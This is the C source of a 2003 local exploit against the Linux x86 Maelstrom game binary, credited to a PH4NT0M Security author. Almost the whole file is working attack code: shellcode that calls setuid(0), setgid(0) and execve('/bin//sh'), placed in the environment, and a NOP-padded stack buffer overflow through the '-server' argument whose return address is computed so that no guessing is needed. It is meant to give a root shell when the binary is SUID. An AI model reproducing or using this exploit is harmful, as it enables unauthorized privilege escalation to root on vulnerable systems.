/*  /usr/bin/Maelstrom local exploit
*** Sorry for my poor english.
*** Others exploit can't exploit my Maelstrom,So I
wrote this exploit just for fun.
*** I can't get a rootshell on my linux ,because it's
not SUID.
*** If it SUID ,this exploit can make you get a rootshell.
*** Tested on redhat9.0 ,other linux maybe OK,too.
***
*** Thanks netric's good paper.
*** You can downlocd it here
http://www.netric.org/papers/envpaper.pdf
*** This paper make me write this exploit don't need to
guess ret.
*** Thanks jsk and axis for their help.
***
*** CONTACT:OYXin@ph4nt0m.net
*** COPYRIGHT (c) 2003 PH4NT0M SECURITY
*** http://www.ph4nt0m.net
*** 2003.5.23

Coded by OYXin(ph4nt0m)
Welcome to http://www.ph4nt0m.net

*/
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

#define  bufsize 8179

/*  linux x86 shellcode by bob from dtors.net,23
bytes,thx them.  */
static char shellcode[] =



   "\x31\xdb"
    "\x89\xd8"
    "\xb0\x17"
    "\xcd\x80"
    "\x31\xdb"
    "\x89\xd8"
    "\xb0\x17"
    "\xcd\x80"
    "\x31\xdb"
    "\x89\xd8"
    "\xb0\x2e"
    "\xcd\x80"
    "\x31\xc0"
    "\x50"
    "\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x31\xd2"
    "\xb0\x0b"
    "\xcd\x80"
     "\x31\xdb"
    "\x89\xd8"
    "\xb0\x01"
    "\xcd\x80";

int main(int argc,char *argv[]){
    char buf[bufsize+1];
    char*prog[]={"/usr/bin/Maelstrom","-server",buf,NULL};
    char  *env[]={"HOME=/root",shellcode,NULL};
    unsigned long ret;


    ret=0xc0000000-sizeof(void*)-strlen(prog[0])-strlen(shellcode)-0x02;

    memset(buf, 0x90, bufsize);
    memset(buf,0x32,sizeof("1"));
    memset(buf+1,0x40,sizeof("1"));
    memcpy(&buf[bufsize-(sizeof(ret))], &ret, sizeof(ret));

    memcpy(&buf[bufsize-(2*sizeof(ret))], &ret,sizeof(ret));

    memcpy(&buf[bufsize-(3*sizeof(ret))], &ret,sizeof(ret));

    memcpy(&buf[bufsize-(4*sizeof(ret))], &ret,sizeof(ret));
    buf[bufsize] = '\0';

    execve(prog[0],prog,env);

    return  0;
}